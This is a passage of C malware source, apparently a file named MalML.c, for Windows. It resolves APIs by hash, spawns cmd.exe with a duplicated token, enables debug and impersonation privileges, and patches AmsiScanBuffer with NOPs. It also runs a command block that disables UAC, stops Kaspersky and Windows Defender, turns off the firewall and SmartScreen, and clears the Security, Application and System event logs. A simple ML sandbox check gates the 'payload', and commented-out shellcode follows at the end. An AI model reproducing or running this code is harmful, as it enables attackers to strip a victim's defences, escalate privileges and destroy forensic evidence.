    DWORD* name_rvas = (DWORD*)(base_addr + export_dir->AddressOfNames);
    WORD* ordinals = (WORD*)(base_addr + export_dir->AddressOfNameOrdinals);
    DWORD* func_rvas = (DWORD*)(base_addr + export_dir->AddressOfFunctions);

    for (DWORD i = 0; i < export_dir->NumberOfNames; ++i) {
        const char* func_name = (const char*)(base_addr + name_rvas[i]);
        DWORD func_hash = hash_api_name(func_name);
        if (func_hash == hash) {
            return (FARPROC)(base_addr + func_rvas[ordinals[i]]);
        }
    }
    return NULL;
}

int load_apis(api_entry* apis) {
    HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");
    if (!hAdvapi32) {
        printf("{[-]} Failed to load advapi32.dll\n");
        return 0;
    }

    const char* api_names[API_COUNT] = {
        "CreateProcessWithTokenW"
    };

    for (int i = 0; i < API_COUNT; ++i) {
        DWORD api_hash = hash_api_name(api_names[i]);
        FARPROC api_address = resolve_api_by_hash(hAdvapi32, api_hash);
        if (!api_address) {
            printf("{[-]} Failed to resolve %s\n", api_names[i]);
            return 0;
        }
        apis[i].api_hash = api_hash;
        apis[i].api_address = api_address;
    }

    return 1;
}

void RunAsSystem() {
    // SID for NT AUTHORITY\SYSTEM
    PSID pSystemSID;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;

    if (!AllocateAndInitializeSid(&NtAuthority, 1, SECURITY_LOCAL_SYSTEM_RID,
                                   0, 0, 0, 0, 0, 0, 0, &pSystemSID)) {
        printf("{[-]} AllocateAndInitializeSid failed : %lu\n", GetLastError());
        return;
    }

    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        printf("{[-]} OpenProcessToken failed : %lu\n", GetLastError());
        FreeSid(pSystemSID);
        return;
    }

    HANDLE hNewToken;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {
        printf("{[-]} DuplicateTokenEx failed : %lu\n", GetLastError());
        CloseHandle(hToken);
        FreeSid(pSystemSID);
        return;
    }

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

// ######################################################
            runCommand("powershell.exe New-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force");
            runCommand("net stop \"Kaspersky Lab Kaspersky Security Center\"");
            runCommand("net stop \"Kaspersky Lab Kaspersky Endpoint Security\"");
            runCommand("netsh advfirewall set allprofiles state off");
            runCommand("netsh advfirewall show allprofiles");
            runCommand("netsh advfirewall set allprofiles state on");
            runCommand("sc stop WinDefend");
            runCommand("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"EnableLUA\" /t REG_DWORD /d 0 /f");
            runCommand("netsh advfirewall set allprofiles state off");
            runCommand("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\" /v \"SmartScreenEnabled\" /t REG_SZ /d \"off\" /f");
            runCommand("reg add \"HKCU\\SOFTWARE\\Microsoft\\Security Center\" /v \"NotificationsDisabled\" /t REG_DWORD /d 1 /f");
            runCommand("powershell.exe -command wevtutil cl Security");
            runCommand("powershell.exe -command wevtutil cl Application");
            runCommand("powershell.exe -command wevtutil cl System");

            runCommand("timeout 99999");
// ######################################################
    api_entry apis[API_COUNT] = { 0 };

    if (!load_apis(apis)) {
        printf("{[-]} Failed to load APIs\n");
    }

    typedef BOOL(WINAPI* CreateProcessWithTokenW_t)(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
    CreateProcessWithTokenW_t CreateProcessWithTokenW_fn = (CreateProcessWithTokenW_t)apis[CREATE_PROCESS_WITH_TOKEN_W].api_address;

    if (!CreateProcessWithTokenW_fn) {
        printf("{[-]} Failed to resolve CreateProcessWithTokenW\n");
    }

    if (!CreateProcessWithTokenW_fn(hNewToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        printf("{[-]} CreateProcessWithTokenW failed: %lu\n", GetLastError());
    } else {
        printf("{[#]} Successfully started process as SYSTEM.\n");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    CloseHandle(hToken);
    CloseHandle(hNewToken);
    FreeSid(pSystemSID);
}

void GetPrivileges() {
    HANDLE tokenHandle = NULL;
    TOKEN_PRIVILEGES tokenPrivileges;
    LUID luid;
    DWORD error;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle)) {
        printf("{[-]} Failed to open process token : %lu\n", GetLastError());
        return;
    }

    const char* privilegesToEnable[] = {
        SE_DEBUG_NAME,           
        SE_IMPERSONATE_NAME,     
        SE_LOAD_DRIVER_NAME,     
        SE_BACKUP_NAME,          
        SE_RESTORE_NAME,         
        SE_SYSTEMTIME_NAME       
    };

    for (int i = 0; i < sizeof(privilegesToEnable) / sizeof(privilegesToEnable[0]); i++) {
        if (!LookupPrivilegeValue(NULL, privilegesToEnable[i], &luid)) {
            printf("{[-]} LookupPrivilegeValue failed for %s : %lu\n", privilegesToEnable[i], GetLastError());
            continue; 
        }

        tokenPrivileges.PrivilegeCount = 1;
        tokenPrivileges.Privileges[0].Luid = luid;
        tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (!AdjustTokenPrivileges(tokenHandle, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL)) {
            error = GetLastError();
            if (error == ERROR_NOT_ALL_ASSIGNED) {
                printf("{[-]} Privilege %s not enabled: not all assigned.\n", privilegesToEnable[i]);
            } else {
                printf("{[-]} AdjustTokenPrivileges failed for %s : %lu\n", privilegesToEnable[i], error);
            }
        } else {
            printf("{[+]} Successfully enabled privilege : %s\n", privilegesToEnable[i]);
        }
    }
    
    RunAsSystem();

    if (tokenHandle) {
        CloseHandle(tokenHandle);
    }
}


void HookAmsi() {
    HMODULE amsiDll = LoadLibraryA("amsi.dll");
    if (!amsiDll) {
        printf("{[-]} Failed to load amsi.dll\n");
        return;
    }

    FARPROC amsiScanBuffer = GetProcAddress(amsiDll, "AmsiScanBuffer");
    if (!amsiScanBuffer) {
        printf("{[-]} Failed to get AmsiScanBuffer address\n");
        return;
    }

    DWORD oldProtect;
    VirtualProtect(amsiScanBuffer, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    BYTE* patch = (BYTE*)amsiScanBuffer;
    patch[0] = 0x90; // NOP
    patch[1] = 0x90; // NOP
    patch[2] = 0x90; // NOP
    patch[3] = 0x90; // NOP
    patch[4] = 0x90; // NOP

    VirtualProtect(amsiScanBuffer, 5, oldProtect, &oldProtect);

    printf("{[#]} Bypassed AMSI successfully!\n");
}

void PrintSystemFeatures() {
    MEMORYSTATUSEX memoryStatus;  // Use MEMORYSTATUSEX for 64-bit support
    memoryStatus.dwLength = sizeof(memoryStatus);
    if (GlobalMemoryStatusEx(&memoryStatus)) {
        // Print total and available physical memory in MB
        printf("{[+]} Total Physical Memory     : %llu MB\n", memoryStatus.ullTotalPhys / (1024 * 1024));
        printf("{[+]} Available Physical Memory : %llu MB\n", memoryStatus.ullAvailPhys / (1024 * 1024));
    } else {
        printf("{[-]} Error retrieving memory status.\n");
    }
}

// Machine learning model for dynamic behavior adaptation
int EvaluateMLModel(float cpuUsage, float memoryUsage, int sandboxDetected) {
    float W1 = -0.5f, W2 = 0.7f, W3 = -1.5f, Bias = 0.2f;
    float decisionScore = W1 * cpuUsage + W2 * memoryUsage + W3 * sandboxDetected + Bias;
    return decisionScore > 0 ? 1 : 0;
}

float GetCpuUsage() {
    FILETIME idleTime, kernelTime, userTime;
    static FILETIME prevIdleTime = {0}, prevKernelTime = {0}, prevUserTime = {0};
    
    // Get the current times
    GetSystemTimes(&idleTime, &kernelTime, &userTime);

    // Calculate the CPU usage
    ULONGLONG idle = *(ULONGLONG*)&idleTime - *(ULONGLONG*)&prevIdleTime;
    ULONGLONG kernel = *(ULONGLONG*)&kernelTime - *(ULONGLONG*)&prevKernelTime;
    ULONGLONG user = *(ULONGLONG*)&userTime - *(ULONGLONG*)&prevUserTime;

    ULONGLONG total = (kernel + user);
    float cpuUsage = total > 0 ? (1.0f - (float)idle / total) * 100.0f : 0.0f;

    // Store current times for next calculation
    prevIdleTime = idleTime;
    prevKernelTime = kernelTime;
    prevUserTime = userTime;

    return cpuUsage;
}

// Function to get memory usage
float GetMemoryUsage() {
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    if (GlobalMemoryStatusEx(&memoryStatus)) {
        float memoryUsage = ((float)(memoryStatus.ullTotalPhys - memoryStatus.ullAvailPhys) / (float)memoryStatus.ullTotalPhys) * 100.0f;
        return memoryUsage;
    }
    return 0.0f;
}

int main() {
    DynamicNeuralNetwork nn; 
    nn = InitializeDynamicNeuralNetwork(INITIAL_HIDDEN_SIZE, INITIAL_LEARNING_RATE);
    srand((unsigned int)time(NULL));

    for (int iteration = 0; iteration < 1000; iteration++) {
        float inputs[INPUT_SIZE] = { 0.0f }; // GetMockEnvironmentFeatures(); // Mock data
        inputs[2] = (rand() % 2); // Simulating sandbox feature input

        int expected = (inputs[2] == 1) ? 0 : 1;
        TrainDynamicNeuralNetwork(&nn, inputs, expected);
    }

    float cpuUsage = GetCpuUsage();
    float memoryUsage = GetMemoryUsage();
    int sandboxDetected = DetectSandbox() ? 1 : 0;
    int executeMalware = EvaluateMLModel(cpuUsage, memoryUsage, sandboxDetected);
    
    PrintSystemFeatures();
    
    if (executeMalware) {
        printf("{[#]} Environment seems safe, executing payload...\n");
        BypassUAC();
        GetPrivileges();
        HookAmsi();
        AdvaML_DL_Obfuscation_Techniques(&nn);
    } else {
        printf("{[!]} Suspicious environment detected, halting execution.\n");
    }
    free(nn.weights_input_hidden);
    free(nn.weights_hidden_output);
    free(nn.hidden_layer);
    free(nn.output_layer);
    return 0;

/*
cl MalML.c /I "C:/Users/Administrator/Desktop/vcpkg/packages/openssl_x64-windows/include" /link "C:/Users/Administrator/Desktop/vcpkg/packages/openssl_x64-windows/lib/libssl.lib" "C:/Users/Administrator/Desktop/vcpkg/packages/openssl_x64-windows/lib/libcrypto.lib" iphlpapi.lib user32.lib shell32.lib advapi32.lib
*/

}


// shellcode for calc.exe
/*
unsigned char shellcode[] = {
        0xdb, 0xde, 0xd9, 0x74, 0x24, 0xf4, 0x58, 0x2b,
        0xc9, 0xb1, 0x31, 0xba, 0xef, 0xc3, 0xbd, 0x59,
        0x83, 0xc0, 0x04, 0x31, 0x50, 0x14, 0x03, 0x50,
        0xfb, 0x21, 0x48, 0xa5, 0xeb, 0x24, 0xb3, 0x56,
        0xeb, 0x48, 0x3d, 0xb3, 0xda, 0x48, 0x59, 0xb7,
        0x4c, 0x79, 0x29, 0x95, 0x60, 0xf2, 0x7f, 0x0e,
        0xf3, 0x76, 0xa8, 0x21, 0xb4, 0x3d, 0x8e, 0x0c,
        0x45, 0x6d, 0xf2, 0x0f, 0xc5, 0x6c, 0x27, 0xf0,
        0xf4, 0xbe, 0x3a, 0xf1, 0x31, 0xa2, 0xb7, 0xa3,
        0xea, 0xa8, 0x6a, 0x54, 0x9f, 0xe5, 0xb6, 0xdf,
        0xd3, 0xe8, 0xbe, 0x3c, 0xa3, 0x0b, 0xee, 0x92,
        0xb8, 0x55, 0x30, 0x14, 0x6d, 0xee, 0x79, 0x0e,
        0x72, 0xcb, 0x30, 0xa5, 0x40, 0xa7, 0xc2, 0x6f,
        0x99, 0x48, 0x68, 0x4e, 0x16, 0xbb, 0x70, 0x96,
        0x90, 0x24, 0x07, 0xee, 0xe3, 0xd9, 0x10, 0x35,
        0x9e, 0x05, 0x94, 0xae, 0x38, 0xcd, 0x0e, 0x0b,
        0xb9, 0x02, 0xc8, 0xd8, 0xb5, 0xef, 0x9e, 0x87,
        0xd9, 0xee, 0x73, 0xbc, 0xe5, 0x7b, 0x72, 0x13,
        0x6c, 0x3f, 0x51, 0xb7, 0x35, 0x9b, 0xf8, 0xee,
        0x93, 0x4a, 0x04, 0xf0, 0x7c, 0x32, 0xa0, 0x7a,
        0x90, 0x27, 0xd9, 0x20, 0xfe, 0xb6, 0x6f, 0x5f,
        0x4c, 0xb8, 0x6f, 0x60, 0xe0, 0xd1, 0x5e, 0xeb,
        0x6f, 0xa5, 0x5e, 0x3e, 0xd4, 0x59, 0x15, 0x63,
        0x7c, 0xf2, 0xf0, 0xf1, 0x3d, 0x9f, 0x02, 0x2c,
        0x01, 0xa6, 0x80, 0xc5, 0xf9, 0x5d, 0x98, 0xaf,
        0xfc, 0x1a, 0x1e, 0x43, 0x8c, 0x33, 0xcb, 0x63,
        0x23, 0x33, 0xde, 0x07, 0xa2, 0xa7, 0x82, 0xe9,
        0x41, 0x40, 0x20, 0xf6
    };
*/
